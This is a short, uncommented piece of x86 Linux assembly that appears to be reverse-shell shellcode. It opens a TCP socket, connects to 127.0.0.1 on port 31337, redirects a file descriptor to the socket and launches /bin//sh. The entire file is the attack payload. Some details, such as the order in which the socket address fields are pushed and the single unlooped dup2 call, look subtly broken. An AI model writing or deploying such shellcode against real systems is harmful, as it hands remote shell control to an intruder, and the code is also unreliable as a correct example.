.global main
.section text

main:
push $0x66
pop %eax

push $0x1
pop %ebx

xor %edx, %edx
push %edx	
push %ebx
push $0x2
mov %esp, %ecx

int $0x80
mov %eax, %edx

push $0x66
pop %eax

inc %ebx          
pushw %bx
push $0x0100007f
pushw $0x697a
mov %esp, %ecx

push $0x10
push %ecx
push %edx

mov %esp, %ecx

inc %ebx

int $0x80

mov %edx, %ebx
push $0x3f
pop %eax
int $0x80

push $0x0b
pop %eax

xor %ecx, %ecx
mov %ecx, %edx

push %edx
push $0x68732f2f
push $0x6e69622f

mov %esp, %ebx

int $0x80
